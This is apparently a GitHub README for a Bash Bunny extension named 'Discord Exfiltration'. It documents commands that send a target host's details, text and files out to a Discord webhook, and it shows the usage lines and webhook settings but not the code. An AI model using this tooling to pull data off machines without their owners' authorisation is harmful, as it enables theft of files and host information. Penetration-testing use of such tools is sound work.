<div align="center">

# Discord Exfiltration

![Bash](https://img.shields.io/badge/Shell_Script-121011?style=for-the-badge&logo=gnu-bash&logoColor=white)
![Quack](https://img.shields.io/badge/Ducky_Script-121011?style=for-the-badge&logo=duck&logoColor=white)

A discord exfiltration extension

[Documentation](#documentation) • [License](#license) . [Changelog](#changelog) . [Support](#support)


</div>

This bashbunny extension provide exfiltration of text and files through discord webhook

# Documentation

>To use this extension, you need to create a webhook on discord and get the webhook id and token
During your setup steps, you need to set the DISCORD_WEBHOOK_ID and DISCORD_WEBHOOK_TOKEN variables

```bash
DISCORD_WEBHOOK_ID="<DISCORD_WEBHOOK_ID>"
DISCORD_WEBHOOK_TOKEN="<DISCORD_WEBHOOK_TOKEN>"
```

### DISCORD INIT

Initialize the exfiltration session by posting an embed message on discord with host information
This command need ```$BB_HOST_OS, $BB_HOST_IP_V4, $BB_HOST_IP_V6, BB_HOST_IP_USER``` variables to be set (Set by default if you use my OSX extension)

<img width="300" alt="image" src="https://github.com/quentinlamamy/bashbunny/blob/23c6dc74f5e719e2f6fb067a96c493ca03947992/img/discord_embed.png?raw=true">

## DISCORD SEND MSG

Send a message to discord via webhook

```bash
DISCORD SEND MSG $yourMessage
```

## DISCORD SEND FILE

Send a file to discord via webhook
```bash
DISCORD SEND FILE $yourFilePath
```

# License

# Changelog

v1.0 : 
* :tada: Release on 2023/07/31

# Contributing
A bug ? An idea of feature ? [Fill an issue on github](https://github.com/quentinlamamy/ffmpeg-panda/issues)

# Support
<a href="https://www.buymeacoffee.com/quentinlamamy" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>
